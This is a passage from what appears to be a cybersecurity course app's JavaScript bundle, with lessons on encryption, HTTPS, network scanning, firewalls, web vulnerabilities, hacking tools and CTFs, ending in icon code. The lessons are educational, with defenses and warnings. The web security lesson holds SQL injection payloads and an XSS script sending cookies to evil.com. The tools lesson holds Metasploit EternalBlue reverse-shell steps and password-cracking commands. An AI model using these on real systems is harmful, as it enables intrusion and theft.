  🗝️ Private Key (kept secret!)

Alice wants to send Bob a message:
  1. Alice encrypts with Bob's PUBLIC key
  2. Only Bob's PRIVATE key can decrypt it!
\`\`\`

\`\`\`
Alice: "Hey Bob!" 
  → Encrypt with Bob's 🔑 Public Key
  → "x8k2m9p..."
  → Send to Bob

Bob receives: "x8k2m9p..."
  → Decrypt with 🗝️ Private Key  
  → "Hey Bob!"

Hacker intercepts: "x8k2m9p..."
  → Has no private key
  → Can't decrypt! 🔒
\`\`\`

### Real-World Uses

| Where | Encryption Used |
|-------|----------------|
| HTTPS websites | TLS (asymmetric + symmetric) |
| WhatsApp | Signal Protocol (end-to-end) |
| Bitcoin | Elliptic Curve Cryptography |
| Wi-Fi (WPA3) | AES encryption |
| File storage | AES-256 |

<tip>
💡 When you see HTTPS, your browser and the server did an asymmetric key exchange, then switched to faster symmetric encryption for the actual data!
</tip>

### Hashing vs Encryption

\`\`\`
Encryption: Plaintext ←→ Ciphertext (reversible!)
Hashing:    Plaintext  →  Hash      (one-way only!)
\`\`\`

Hashing is used for passwords — the website never needs to get your password back, just check if it matches!

Understanding encryption is understanding the backbone of internet security! 🔐
          `},{id:"4-2",title:"HTTPS & Secure Communication",duration:"10 min",content:`
## How HTTPS Keeps You Safe 🔒

Every time you visit a website with 🔒, encryption is protecting you!

### The TLS Handshake

When you visit https://google.com:

\`\`\`
1. YOUR BROWSER → "Hello! I want a secure connection"
2. GOOGLE → "Here's my certificate + public key" 📜
3. YOUR BROWSER → Verifies certificate is legit
4. YOUR BROWSER → Generates a session key
5. YOUR BROWSER → Encrypts session key with Google's 
                  public key, sends it
6. GOOGLE → Decrypts with private key
7. BOTH → Now share the same session key!
8. ALL DATA → Encrypted with session key 🔒
\`\`\`

### Certificates — Proof of Identity

A certificate says: "I am really google.com"

\`\`\`
Certificate for: google.com
Issued by: Google Trust Services (CA)
Valid: Jan 2024 - Apr 2024
Public Key: [included]
Signature: [CA signed this]
\`\`\`

**Certificate Authorities (CAs)** are trusted organizations that verify identities. Your browser comes with a list of trusted CAs.

### What Happens Without HTTPS

On public Wi-Fi with HTTP:

\`\`\`
You → "My password is hunter2" → Wi-Fi → Website
                                   ↑
                              Hacker sees:
                         "My password is hunter2" 😱

With HTTPS:
You → "x8k2m9p4..." → Wi-Fi → Website
                         ↑
                    Hacker sees:
                  "x8k2m9p4..." 🤷
\`\`\`

### Man-in-the-Middle (MITM) Attack

\`\`\`
Normal:
You ←──────────→ Google

MITM Attack:
You ←────→ Hacker ←────→ Google
           (reads everything!)
\`\`\`

HTTPS prevents this because the hacker can't forge Google's certificate!

### Check a Site's Certificate

Click the 🔒 in your browser:
1. See who issued the certificate
2. Check if it's valid
3. View the encryption details

\`\`\`bash
# Check certificate from terminal
openssl s_client -connect google.com:443 -brief

# See certificate details
echo | openssl s_client -connect google.com:443 2>/dev/null | openssl x509 -text
\`\`\`

### End-to-End Encryption (E2EE)

Apps like Signal and WhatsApp use E2EE:

\`\`\`
Regular encryption:
You → [Encrypted] → Server [DECRYPTED] → [Encrypted] → Friend
                     Server can read! 😰

End-to-End encryption:
You → [Encrypted] → Server [still encrypted] → Friend
                     Server can't read! ✅
\`\`\`

Only you and the recipient have the keys!

### VPNs — Your Encrypted Tunnel

\`\`\`
Without VPN:
You → ISP (sees everything) → Internet
      Your ISP knows every site you visit!

With VPN:
You → [Encrypted Tunnel] → VPN Server → Internet
      ISP sees only encrypted data!
      But... VPN server sees your traffic
\`\`\`

<warning>
⚠️ VPNs move trust, not remove it. You're trusting the VPN provider instead of your ISP. Choose carefully!
</warning>

<tip>
💡 Free VPNs often sell your data. If you're not paying, YOU are the product!
</tip>

Now you understand how encryption protects your data online! 🛡️
          `}]},{id:5,title:"Network Security",description:"Defend and analyze networks",lessons:[{id:"5-1",title:"Network Scanning & Reconnaissance",duration:"14 min",content:`
## Seeing What's on Your Network 🔍

Before you can defend a network, you need to know what's on it!

### What is Reconnaissance?

The first step in both hacking AND defending:
1. **What devices are connected?**
2. **What ports are open?**
3. **What services are running?**

### Nmap — The Network Scanner

**Nmap** is the most famous security scanning tool:

\`\`\`bash
# Scan your local network (find all devices)
nmap -sn 192.168.1.0/24

# Output:
# Host is up: 192.168.1.1    (Router)
# Host is up: 192.168.1.100  (Your PC)
# Host is up: 192.168.1.101  (Phone)
# Host is up: 192.168.1.105  (Smart TV)
\`\`\`

### Port Scanning

\`\`\`bash
# Scan a specific device for open ports
nmap 192.168.1.1

# Output:
# PORT    STATE  SERVICE
# 22/tcp  open   ssh
# 80/tcp  open   http
# 443/tcp open   https
# 8080/tcp open  http-proxy
\`\`\`

### Understanding Port States

| State | Meaning |
|-------|---------|
| **open** | Service is listening (accessible!) |
| **closed** | Port exists but no service |
| **filtered** | Firewall is blocking the scan |

### Wireshark — See ALL Network Traffic

**Wireshark** captures and displays every packet on your network:

\`\`\`
No. | Time    | Source          | Dest            | Protocol | Info
1   | 0.000   | 192.168.1.100  | 142.250.80.46  | TCP      | SYN
2   | 0.012   | 142.250.80.46  | 192.168.1.100  | TCP      | SYN-ACK
3   | 0.013   | 192.168.1.100  | 142.250.80.46  | TCP      | ACK
4   | 0.014   | 192.168.1.100  | 142.250.80.46  | TLS      | Client Hello
\`\`\`

### What You Can See in Wireshark

\`\`\`
✅ DNS queries (what sites devices visit)
✅ Unencrypted HTTP traffic
✅ Connection patterns
✅ Suspicious traffic
❌ HTTPS content (encrypted!)
❌ VPN traffic content
\`\`\`

### Netstat — Check Your Own Connections

\`\`\`bash
# See all active connections on your computer
netstat -an

# Windows: see which programs have connections
netstat -ab

# Mac/Linux: with process IDs
netstat -tulpn
# or
ss -tulpn
\`\`\`

<tip>
💡 If you see connections to IPs you don't recognize, it could be malware phoning home!
</tip>

### DNS Lookup Tools

\`\`\`bash
# Find IP of a domain
nslookup example.com

# Detailed DNS info
dig example.com

# Reverse lookup (IP → domain)
nslookup 8.8.8.8
# Result: dns.google
\`\`\`

### Traceroute — Follow the Path

See every router between you and a destination:

\`\`\`bash
# Mac/Linux
traceroute google.com

# Windows
tracert google.com

# Output:
# 1  192.168.1.1      (your router)
# 2  10.0.0.1         (ISP)
# 3  72.14.215.85     (backbone)
# 4  142.250.80.46    (Google!)
\`\`\`

### Practice: Scan Your Home Network

\`\`\`bash
# 1. Find your IP
ifconfig  # or ipconfig on Windows

# 2. Scan your network
nmap -sn 192.168.1.0/24

# 3. Count devices - do you recognize them all?
# Unknown devices = potential security issue!
\`\`\`

<warning>
⚠️ Only scan networks you OWN or have permission to scan. Scanning others' networks can be illegal!
</warning>

Knowing your network is the first step to defending it! 🔍
          `},{id:"5-2",title:"Firewalls & Defense",duration:"10 min",content:`
## Building Your Fortress 🏰

Now that you can see what's on a network, let's protect it!

### What is a Firewall?

A firewall is a gatekeeper that decides what traffic gets in and out:

\`\`\`
Internet → [FIREWALL] → Your Network
                ↓
        Rules decide:
        ✅ Allow web traffic (80, 443)
        ✅ Allow email (25, 587)
        ❌ Block everything else
\`\`\`

### Firewall Rules

Rules follow this format:
\`\`\`
ACTION  DIRECTION  PROTOCOL  PORT  SOURCE/DEST

ALLOW   INBOUND    TCP       443   Any → Server
ALLOW   OUTBOUND   TCP       80    Server → Any  
DENY    INBOUND    TCP       22    Any → Server
DENY    INBOUND    ALL       ALL   Any → Any (default)
\`\`\`

### Linux Firewall (iptables/ufw)

\`\`\`bash
# UFW (Uncomplicated Firewall) - easy mode!

# Enable firewall
sudo ufw enable

# Allow web server
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp

# Allow SSH from specific IP only
sudo ufw allow from 192.168.1.100 to any port 22

# Block everything else (default)
sudo ufw default deny incoming
sudo ufw default allow outgoing

# Check rules
sudo ufw status
\`\`\`

### Windows Firewall

\`\`\`
Settings → Windows Security → Firewall
- Domain networks: ON
- Private networks: ON
- Public networks: ON (most restrictive!)
\`\`\`

### Types of Firewalls

| Type | What It Does |
|------|-------------|
| **Packet Filter** | Checks each packet against rules |
| **Stateful** | Tracks connection states |
| **Application** | Understands HTTP, DNS, etc. |
| **Next-Gen (NGFW)** | Deep inspection + AI |

### Intrusion Detection (IDS) vs Prevention (IPS)

\`\`\`
IDS: "Hey, I saw something suspicious!" (alerts only)
IPS: "Suspicious traffic BLOCKED!" (takes action)
\`\`\`

### Network Segmentation

Don't put everything on one network!

\`\`\`
BAD (flat network):
[Server] - [PC] - [Smart TV] - [IoT Camera]
  ↑ If one gets hacked, hacker has access to ALL

GOOD (segmented):
[Server VLAN] | [Office VLAN] | [IoT VLAN]
  ↑ Hacked IoT camera can't reach the server!
\`\`\`

### Wi-Fi Security

| Protocol | Security | Status |
|----------|----------|--------|
| WEP | ❌ Broken | Never use |
| WPA | ⚠️ Weak | Avoid |
| WPA2 | ✅ Good | Current standard |
| WPA3 | ✅✅ Best | Use if available |

\`\`\`
Your Wi-Fi Checklist:
☐ WPA2 or WPA3 enabled
☐ Strong password (not "password123")
☐ Default router admin password changed
☐ WPS disabled (it's hackable!)
☐ Guest network for visitors
☐ Router firmware up to date
\`\`\`

<tip>
💡 Your router's admin page is usually at 192.168.1.1 or 192.168.0.1 — log in and check your security settings!
</tip>

### Defense in Depth

Don't rely on just one defense:

\`\`\`
Layer 1: Firewall (network perimeter)
Layer 2: Antivirus (endpoint protection)
Layer 3: Updates/Patches (close vulnerabilities)
Layer 4: Strong passwords + 2FA (access control)
Layer 5: Training (human awareness)
Layer 6: Backups (recovery plan)
\`\`\`

Multiple layers = much harder to hack! 🏰
          `}]},{id:6,title:"Web Security",description:"How websites get hacked",lessons:[{id:"6-1",title:"Common Web Vulnerabilities",duration:"14 min",content:`
## How Websites Get Hacked 🌐

Websites are one of the biggest attack targets. Let's learn how they break!

### SQL Injection (SQLi)

The #1 web vulnerability for decades!

Normal login:
\`\`\`sql
SELECT * FROM users WHERE username = 'alice' AND password = 'secret123'
\`\`\`

Hacker enters this as username:
\`\`\`
' OR '1'='1' --
\`\`\`

The query becomes:
\`\`\`sql
SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = ''
\`\`\`

\`'1'='1'\` is always true → Returns ALL users → Hacker is logged in! 😱

### SQL Injection - Data Theft

\`\`\`sql
-- Hacker enters in search box:
' UNION SELECT username, password FROM users --

-- Returns all usernames and passwords!
\`\`\`

### Defense Against SQLi

\`\`\`python
# BAD - Vulnerable to SQL injection!
query = f"SELECT * FROM users WHERE name = '{user_input}'"

# GOOD - Parameterized query (safe!)
query = "SELECT * FROM users WHERE name = ?"
cursor.execute(query, (user_input,))
\`\`\`

<warning>
⚠️ NEVER put user input directly into SQL queries! Always use parameterized queries.
</warning>

### Cross-Site Scripting (XSS)

Injecting JavaScript into a website:

\`\`\`html
<!-- Hacker posts this as a comment: -->
<script>
  document.location = 'https://evil.com/steal?cookie=' 
    + document.cookie;
<\/script>

<!-- When other users view the comment, 
     their cookies get stolen! -->
\`\`\`

### Types of XSS

| Type | How It Works |
|------|-------------|
| **Stored XSS** | Malicious code saved in database (comments, profiles) |
| **Reflected XSS** | Code in URL, reflected back by server |
| **DOM XSS** | Manipulates page JavaScript directly |

### Defense Against XSS

\`\`\`python
# Escape HTML special characters
import html
safe_input = html.escape(user_input)
# <script> becomes &lt;script&gt; (won't execute!)
\`\`\`

\`\`\`
Content-Security-Policy: script-src 'self'
↑ Only allow scripts from your own domain!
\`\`\`

### Cross-Site Request Forgery (CSRF)

Trick logged-in users into performing actions:

\`\`\`html
<!-- On evil website: -->
<img src="https://bank.com/transfer?to=hacker&amount=10000">

<!-- Your browser sends the request WITH your 
     bank session cookie! -->
\`\`\`

Defense: **CSRF tokens** — random values that attackers can't guess.

### Insecure Direct Object References (IDOR)

\`\`\`
Your profile: https://site.com/user/profile?id=123
Change to:    https://site.com/user/profile?id=124
→ See someone else's profile! 😱
\`\`\`

Defense: Always check authorization on the server!

### The OWASP Top 10

The most critical web security risks:

1. Broken Access Control
2. Cryptographic Failures
3. Injection (SQLi, XSS)
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable Components
7. Authentication Failures
8. Data Integrity Failures
9. Security Logging Failures
10. Server-Side Request Forgery

<tip>
💡 The OWASP Top 10 is updated regularly and is the gold standard for web security awareness!
</tip>

### Practice: Try Hacking (Legally!)

Safe practice environments:
- **DVWA** (Damn Vulnerable Web App)
- **HackTheBox** (online challenges)
- **TryHackMe** (guided learning)
- **PortSwigger Web Security Academy** (free!)

These are LEGAL practice environments designed to be hacked! 🎯
          `},{id:"6-2",title:"Securing Your Digital Life",duration:"10 min",content:`
## Your Personal Security Checklist ✅

Let's apply everything you've learned to protect YOUR digital life!

### Browser Security

\`\`\`
✅ Use HTTPS Everywhere (or browser's built-in)
✅ Block third-party cookies
✅ Use ad blocker (uBlock Origin)
✅ Don't save passwords in browser
   (use a password manager instead!)
✅ Keep browser updated
✅ Review extensions (remove unused ones)
\`\`\`

### Phone Security

\`\`\`
✅ Enable screen lock (PIN, fingerprint, face)
✅ Keep OS and apps updated
✅ Only install apps from official stores
✅ Review app permissions
   (Does a flashlight need your contacts? NO!)
✅ Enable "Find My Device"
✅ Encrypt your phone (usually on by default)
\`\`\`

### Social Media Security

\`\`\`
✅ Make profiles private
✅ Don't share:
   - Full birthday
   - Home address
   - School/work location in real-time
   - Vacation plans ("We're away for 2 weeks!")
✅ Review tagged photos
✅ Enable login notifications
✅ Check connected apps regularly
\`\`\`

### Email Security

\`\`\`
✅ Use unique password + 2FA
✅ Don't click links in suspicious emails
✅ Check sender address carefully
✅ Don't open unexpected attachments
✅ Use separate emails:
   - Personal email
   - Shopping/accounts email
   - Throwaway for signups
\`\`\`

### Wi-Fi Security

\`\`\`
✅ Never use public Wi-Fi for banking
✅ Use VPN on public networks
✅ Forget networks when done
✅ Don't auto-connect to open networks
✅ Use your phone hotspot instead
\`\`\`

<warning>
⚠️ Public Wi-Fi is NEVER safe! Anyone on the same network can potentially see your traffic.
</warning>

### Backup Strategy: 3-2-1 Rule

\`\`\`
3 copies of your data
2 different types of storage
1 offsite copy

Example:
1. Your computer (original)
2. External hard drive (local backup)
3. Cloud storage (offsite backup)
\`\`\`

### Software Updates

\`\`\`
Updates often fix security vulnerabilities:

"Critical security patch available"
→ Install it NOW, not later!

Auto-updates: ENABLE THEM
- Operating system
- Browser
- Phone apps
- Router firmware
\`\`\`

### If You Get Hacked

\`\`\`
1. Change passwords IMMEDIATELY
   (start with email!)
2. Enable 2FA on everything
3. Check for unauthorized access
4. Scan for malware
5. Notify affected services
6. Monitor financial accounts
7. Learn from it!
\`\`\`

<tip>
💡 Check if your email has been in a breach: haveibeenpwned.com — It's free and run by a security researcher!
</tip>

### Your Security Score

Rate yourself:
\`\`\`
[ ] Unique passwords for every account
[ ] Password manager in use
[ ] 2FA on email and banking
[ ] Phone has screen lock
[ ] Browser is up to date
[ ] Don't click suspicious links
[ ] Backups are current
[ ] Wi-Fi uses WPA2/WPA3
[ ] Social media is private

7-9: 🟢 Great security!
4-6: 🟡 Getting there
0-3: 🔴 You're at risk!
\`\`\`

Security is a journey, not a destination! 🛡️
          `}]},{id:7,title:"Ethical Hacking Tools",description:"Tools of the trade",lessons:[{id:"7-1",title:"Kali Linux & Hacking Tools",duration:"12 min",content:`
## The Hacker's Toolkit 🧰

Professional security researchers use specialized tools. Let's explore them!

### Kali Linux

The #1 operating system for ethical hacking:

\`\`\`
What: Linux distro pre-loaded with 600+ security tools
Where: kali.org (free!)
How: Run in VirtualBox or as USB boot
\`\`\`

### Setting Up Kali (In VirtualBox)

\`\`\`bash
# 1. Download VirtualBox (free)
#    virtualbox.org

# 2. Download Kali Linux VM image
#    kali.org/get-kali/

# 3. Import into VirtualBox
#    File → Import Appliance → Select .ova file

# 4. Start it up!
#    Default login: kali / kali
\`\`\`

### Essential Tools Overview

| Tool | Category | What It Does |
|------|----------|-------------|
| **Nmap** | Scanning | Network/port scanning |
| **Wireshark** | Analysis | Packet capture & analysis |
| **Burp Suite** | Web | Web app testing |
| **Metasploit** | Exploitation | Vulnerability exploitation |
| **John the Ripper** | Passwords | Password cracking |
| **Hashcat** | Passwords | GPU-accelerated cracking |
| **Aircrack-ng** | Wireless | Wi-Fi security testing |
| **Hydra** | Passwords | Online brute force |
| **SQLMap** | Web | Automated SQL injection |
| **Nikto** | Web | Web server scanner |

### Nmap Deep Dive

\`\`\`bash
# Basic scan
nmap target.com

# Scan all ports
nmap -p- target.com

# Detect operating system
nmap -O target.com

# Detect services and versions
nmap -sV target.com

# Aggressive scan (OS + services + scripts)
nmap -A target.com

# Scan for vulnerabilities
nmap --script vuln target.com
\`\`\`

### Burp Suite — Web App Testing

\`\`\`
Your Browser → [Burp Proxy] → Website
                    ↓
        See & modify EVERY request!

1. Intercept login requests
2. Modify parameters
3. Replay requests
4. Find hidden endpoints
\`\`\`

### Metasploit Framework

The exploitation Swiss army knife:

\`\`\`bash
# Start Metasploit
msfconsole

# Search for exploits
search apache
search type:exploit platform:windows

# Use an exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target_ip
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST your_ip
exploit
\`\`\`

<warning>
⚠️ ONLY use these tools on systems you have WRITTEN PERMISSION to test! Unauthorized use is a crime.
</warning>

### Password Cracking Tools

\`\`\`bash
# John the Ripper - crack password hashes
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Hashcat - GPU-accelerated (much faster!)
hashcat -m 0 -a 0 hashes.txt rockyou.txt
\`\`\`

### Practice Platforms

Safe, legal places to practice:

\`\`\`
🎯 TryHackMe.com     — Guided rooms, beginner-friendly
🎯 HackTheBox.com    — Realistic challenges
🎯 PicoCTF.org       — Student CTF competitions
🎯 OverTheWire.org   — Wargames (start with Bandit)
🎯 DVWA              — Practice web hacking locally
\`\`\`

<tip>
💡 Start with TryHackMe — it has learning paths from absolute beginner to advanced! And it's free.
</tip>

### Career Paths in Cybersecurity

| Role | What They Do | Avg Salary |
|------|-------------|-----------|
| Security Analyst | Monitor & respond to threats | $80K |
| Penetration Tester | Hack companies (legally!) | $100K |
| Security Engineer | Build secure systems | $120K |
| Bug Bounty Hunter | Find bugs for rewards | Varies ($$$) |
| CISO | Lead security strategy | $200K+ |

### Certifications to Consider

\`\`\`
Beginner:
  CompTIA Security+
  CEH (Certified Ethical Hacker)

Intermediate:
  OSCP (Offensive Security Certified Professional)
  CySA+

Advanced:
  CISSP
  OSCE
\`\`\`

You now know the tools of the trade! Use them wisely! 🛡️
          `}]},{id:8,title:"Capture The Flag",description:"Put your skills to the test",lessons:[{id:"8-1",title:"Your First CTF Challenge",duration:"15 min",content:`
## Capture The Flag! 🏁

**CTF (Capture The Flag)** competitions are how hackers test their skills!

### What is a CTF?

Teams or individuals solve security challenges to find hidden "flags":

\`\`\`
Challenge: "Find the hidden message in this website"
You hack → find → flag{y0u_f0und_th3_s3cr3t}
Submit flag → earn points! 🏆
\`\`\`

### CTF Categories

| Category | What You Do |
|----------|-------------|
| **Web** | Hack websites (XSS, SQLi, etc.) |
| **Crypto** | Break encryption |
| **Forensics** | Analyze files, memory dumps |
| **Reversing** | Reverse engineer programs |
| **Pwn** | Exploit binary programs |
| **OSINT** | Find info from public sources |
| **Misc** | Everything else! |

### Challenge 1: Decode This!

\`\`\`
Find the flag:
ZmxhZ3tiYXNlNjRfaXNfbm90X2VuY3J5cHRpb259
\`\`\`

Hint: It's Base64 encoded!

\`\`\`bash
echo "ZmxhZ3tiYXNlNjRfaXNfbm90X2VuY3J5cHRpb259" | base64 -d
# Output: flag{base64_is_not_encryption}
\`\`\`

<tip>
💡 Base64 is encoding, NOT encryption! Anyone can decode it. It's used for data transport, not security.
</tip>

### Challenge 2: Hidden in Plain Sight

\`\`\`html
<!-- Look at a website's source code -->
<!-- Right-click → View Page Source -->
<!-- Or press Ctrl+U -->

<html>
<head><title>Nothing here...</title></head>
<body>
  <p>This page is empty.</p>
  <!-- flag{always_check_the_source} -->
</body>
</html>
\`\`\`

Developers sometimes leave secrets in HTML comments!

### Challenge 3: HTTP Headers

\`\`\`bash
# Check response headers
curl -I https://challenge.ctf.com

# HTTP/1.1 200 OK
# Content-Type: text/html
# X-Secret-Flag: flag{headers_hide_secrets}
# Server: nginx
\`\`\`

### Challenge 4: robots.txt

\`\`\`bash
# Websites tell search engines what NOT to index
curl https://challenge.ctf.com/robots.txt

# User-agent: *
# Disallow: /secret-admin-panel/
# Disallow: /flag.txt

# Now visit /flag.txt!
curl https://challenge.ctf.com/flag.txt
# flag{robots_txt_is_not_security}
\`\`\`

### Challenge 5: Caesar Cipher Crack

\`\`\`
Encrypted: synt{pnrfne_pvcure_vf_jrnx}
\`\`\`

\`\`\`python
# Try all 26 shifts
def caesar_crack(text):
    for shift in range(26):
        result = ""
        for char in text:
            if char.isalpha():
                base = ord('a') if char.islower() else ord('A')
                result += chr((ord(char) - base + shift) % 26 + base)
            else:
                result += char
        if "flag" in result.lower():
            print(f"Shift {shift}: {result}")

caesar_crack("synt{pnrfne_pvcure_vf_jrnx}")
# Shift 13: flag{caesar_cipher_is_weak}
\`\`\`

This is **ROT13** — a Caesar cipher with shift of 13!

### OSINT Challenge

Find information using only public sources:

\`\`\`
Task: "What is the CEO's email at ExampleCorp?"

Sources to check:
1. Company website (About page)
2. LinkedIn profiles
3. GitHub repositories (check commits!)
4. Google dorking: "ExampleCorp" "CEO" "@"
5. WHOIS records for their domain
6. Cached pages
\`\`\`

### Google Dorking

Advanced Google searches for finding exposed data:

\`\`\`
site:example.com filetype:pdf    → PDFs on a site
intitle:"index of" passwords     → Exposed directories
inurl:admin login                → Admin pages
"password" filetype:log          → Log files with passwords
\`\`\`

<warning>
⚠️ Google dorking to find vulnerabilities in sites you don't own can be illegal. Only use on CTF challenges or with permission!
</warning>

### Where to Play CTFs

\`\`\`
🏁 PicoCTF.org          — Best for beginners!
🏁 CTFtime.org          — Calendar of CTF events
🏁 TryHackMe.com        — Guided challenges
🏁 HackTheBox.com       — Real-world scenarios
🏁 OverTheWire (Bandit)  — Linux command challenges
🏁 CryptoHack.org       — Cryptography challenges
\`\`\`

### Start Your Journey!

\`\`\`
1. Sign up on PicoCTF or TryHackMe
2. Start with the easiest challenges
3. Google when you're stuck (that's how you learn!)
4. Join a team or community
5. Practice regularly
6. Enter real CTF competitions!
\`\`\`

<tip>
💡 The cybersecurity community is incredibly helpful. Join Discord servers, Reddit's r/netsec, and ask questions!
</tip>

Congratulations! You've completed the Cybersecurity course! 🎉

You now have the foundation to:
- Protect yourself online
- Understand how attacks work
- Use security tools ethically
- Start your cybersecurity journey

Stay curious, stay ethical, and keep learning! 🛡️🚀
          `}]}]};const Zd=(...j)=>j.filter((X,K,h)=>!!X&&X.trim()!==""&&h.indexOf(X)===K).join(" ").trim();const Ey=j=>j.replace(/([a-z0-9])([A-Z])/g,"$1-$2").toLowerCase();const zy=j=>j.replace(/^([A-Z])|[\s-_]+(\w)/g,(X,K,h)=>h?h.toUpperCase():K.toLowerCase());const kd=j=>{const X=zy(j);return X.charAt(0).toUpperCase()+X.slice(1)};var Cy={xmlns:"http://www.w3.org/2000/svg",width:24,height:24,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:2,strokeLinecap:"round",strokeLinejoin:"round"};const Oy=j=>{for(const X in j)if(X.startsWith("aria-")||X==="role"||X==="title")return!0;return!1};const _y=Ae.forwardRef(({color:j="currentColor",size:X=24,strokeWidth:K=2,absoluteStrokeWidth:h,className:U="",children:J,iconNode:ce,...Te},k)=>Ae.createElement("svg",{ref:k,...Cy,width:X,height:X,stroke:j,strokeWidth:h?Number(K)*24/Number(X):K,className:Zd("lucide",U),...!J&&!Oy(Te)&&{"aria-hidden":"true"},...Te},[...ce.map(([x,ae])=>Ae.createElement(x,ae)),...Array.isArray(J)?J:[J]]));const de=(j,X)=>{const K=Ae.forwardRef(({className:h,...U},J)=>Ae.createElement(_y,{ref:J,iconNode:X,className:Zd(`lucide-${Ey(kd(j))}`,`lucide-${j}`,h),...U}));return K.displayName=kd(j),K};const My=[["path",{d:"m15.477 12.89 1.515 8.526a.5.5 0 0 1-.81.47l-3.58-2.687a1 1 0 0 0-1.197 0l-3.586 2.686a.5.5 0 0 1-.81-.469l1.514-8.526",key:"1yiouv"}],["circle",{cx:"12",cy:"8",r:"6",key:"1vp47v"}]],Dy=de("award",My);const Hy=[["path",{d:"M12 7v14",key:"1akyts"}],["path",{d:"M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z",key:"ruj8y"}]],bs=de("book-open",Hy);const wy=[["path",{d:"M3 3v16a2 2 0 0 0 2 2h16",key:"c24i48"}],["path",{d:"M18 17V9",key:"2bz60n"}],["path",{d:"M13 17V5",key:"1frdt8"}],["path",{d:"M8 17v-3",key:"17ska0"}]],Bd=de("chart-column",wy);const Uy=[["path",{d:"m6 9 6 6 6-6",key:"qrunsl"}]],Ld=de("chevron-down",Uy);const Ry=[["path",{d:"m9 18 6-6-6-6",key:"mthhwq"}]],jn=de("chevron-right",Ry);const ky=[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["path",{d:"m9 12 2 2 4-4",key:"dzmm74"}]],jl=de("circle-check",ky);const By=[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["path",{d:"m15 9-6 6",key:"1uzhvr"}],["path",{d:"m9 9 6 6",key:"z0biqf"}]],Ly=de("circle-x",By);const Yy=[["path",{d:"M12 6v6l4 2",key:"mmk7yg"}],["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}]],xs=de("clock",Yy);const qy=[["path",{d:"m16 18 6-6-6-6",key:"eg8j8"}],["path",{d:"m8 6-6 6 6 6",key:"ppft3o"}]],Yd=de("code",qy);const Gy=[["rect",{width:"14",height:"14",x:"8",y:"8",rx:"2",ry:"2",key:"17jyea"}],["path",{d:"M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2",key:"zix9uf"}]],Xy=de("copy",Gy);const Qy=[["path",{d:"M12 15V3",key:"m9g1x1"}],["path",{d:"M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4",key:"ih7n3h"}],["path",{d:"m7 10 5 5 5-5",key:"brsn70"}]],Vy=de("download",Qy);const Zy=[["path",{d:"M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 19.876 0 1 1 0 0 1 0 .696 10.75 10.75 0 0 1-19.876 0",key:"1nclc0"}],["circle",{cx:"12",cy:"12",r:"3",key:"1v7zrd"}]],Ky=de("eye",Zy);const Jy=[["path",{d:"M6 22a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h8a2.4 2.4 0 0 1 1.704.706l3.588 3.588A2.4 2.4 0 0 1 20 8v12a2 2 0 0 1-2 2z",key:"1oefj6"}],["path",{d:"M14 2v5a1 1 0 0 0 1 1h5",key:"wfsgrz"}],["path",{d:"M10 12.5 8 15l2 2.5",key:"1tg20x"}],["path",{d:"m14 12.5 2 2.5-2 2.5",key:"yinavb"}]],Wy=de("file-code",Jy);const Fy=[["path",{d:"M6 22a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h8a2.4 2.4 0 0 1 1.704.706l3.588 3.588A2.4 2.4 0 0 1 20 8v12a2 2 0 0 1-2 2z",key:"1oefj6"}],["path",{d:"M14 2v5a1 1 0 0 0 1 1h5",key:"wfsgrz"}],["path",{d:"M10 9H8",key:"b1mrlr"}],["path",{d:"M16 13H8",key:"t4e002"}],["path",{d:"M16 17H8",key:"z1uh3a"}]],Ss=de("file-text",Fy);const $y=[["path",{d:"M20 10a1 1 0 0 0 1-1V6a1 1 0 0 0-1-1h-2.5a1 1 0 0 1-.8-.4l-.9-1.2A1 1 0 0 0 15 3h-2a1 1 0 0 0-1 1v5a1 1 0 0 0 1 1Z",key:"hod4my"}],["path",{d:"M20 21a1 1 0 0 0 1-1v-3a1 1 0 0 0-1-1h-2.9a1 1 0 0 1-.88-.55l-.42-.85a1 1 0 0 0-.92-.6H13a1 1 0 0 0-1 1v5a1 1 0 0 0 1 1Z",key:"w4yl2u"}],["path",{d:"M3 5a2 2 0 0 0 2 2h3",key:"f2jnh7"}],["path",{d:"M3 3v13a2 2 0 0 0 2 2h3",key:"k8epm1"}]],Vi=de("folder-tree",$y);const Iy=[["path",{d:"M15 21v-8a1 1 0 0 0-1-1h-4a1 1 0 0 0-1 1v8",key:"5wwlr5"}],["path",{d:"M3 10a2 2 0 0 1 .709-1.528l7-6a2 2 0 0 1 2.582 0l7 6A2 2 0 0 1 21 10v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z",key:"r6nss1"}]],Py=de("house",Iy);const e0=[["rect",{width:"18",height:"18",x:"3",y:"3",rx:"2",ry:"2",key:"1m3agn"}],["circle",{cx:"9",cy:"9",r:"2",key:"af1f0g"}],["path",{d:"m21 15-3.086-3.086a2 2 0 0 0-2.828 0L6 21",key:"1xmnt7"}]],t0=de("image",e0);const l0=[["rect",{width:"7",height:"9",x:"3",y:"3",rx:"1",key:"10lvy0"}],["rect",{width:"7",height:"5",x:"14",y:"3",rx:"1",key:"16une8"}],["rect",{width:"7",height:"9",x:"14",y:"12",rx:"1",key:"1hutg5"}],["rect",{width:"7",height:"5",x:"3",y:"16",rx:"1",key:"ldoo1y"}]],qd=de("layout-dashboard",l0);const a0=[["path",{d:"M15 14c.2-1 .7-1.7 1.5-2.5 1-.9 1.5-2.2 1.5-3.5A6 6 0 0 0 6 8c0 1 .2 2.2 1.5 3.5.7.7 1.3 1.5 1.5 